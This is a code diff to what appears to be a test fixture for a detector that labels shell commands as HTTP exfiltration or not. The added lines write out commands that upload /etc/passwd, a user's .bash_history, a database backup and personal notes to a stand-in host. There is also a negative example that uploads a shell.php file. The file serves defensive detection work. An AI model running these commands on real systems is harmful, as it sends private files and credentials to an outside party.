@@ -60,7 +60,10 @@ LINES = [
     ("curl -T /etc/passwd http://203.0.113.5:8000/", "http-upload"),
     ("curl -F 'file=@/tmp/d.tgz' http://203.0.113.5/up", "http-upload"),
     ("Invoke-WebRequest -Uri http://203.0.113.5/u -Method POST -InFile C:\\temp\\d.zip", "http-upload"),
-    ("Invoke-RestMethod -Uri http://203.0.113.5/u -Method Post -Body (Get-Content C:\\temp\\d.txt)", "http-upload"),
+    ("Invoke-RestMethod -Uri http://203.0.113.5/u -Method Post -Body (Get-Content C:\\Users\\bob\\notes.txt)",
+     "http-upload"),
+    ("curl --data-binary @/home/bob/.bash_history http://203.0.113.5/", "http-upload"),
+    ("wget --post-file=/var/backups/db.sql http://203.0.113.5/", "http-upload"),
 ]
 
 NOT_THESE = [
@@ -73,6 +76,10 @@ NOT_THESE = [
     "curl -d 'user=a' http://203.0.113.5/login",
     "wmic /node:dc01 os get caption",
     "nxc smb 10.0.0.0/24",
+    # an attacker's own scratch file sent to a target's upload form is ingress, not exfiltration (OpenRAE Duels)
+    'curl -sk -X POST http://172.20.1.20:8080/upload -b /tmp/session.txt -F "file=@/tmp/dbquery.py"',
+    'curl -F "file=@/tmp/test.txt" -L -D - http://172.20.1.20:8080/upload',
+    "curl -T shell.php http://10.0.0.5/webdav/",
 ]
 
 
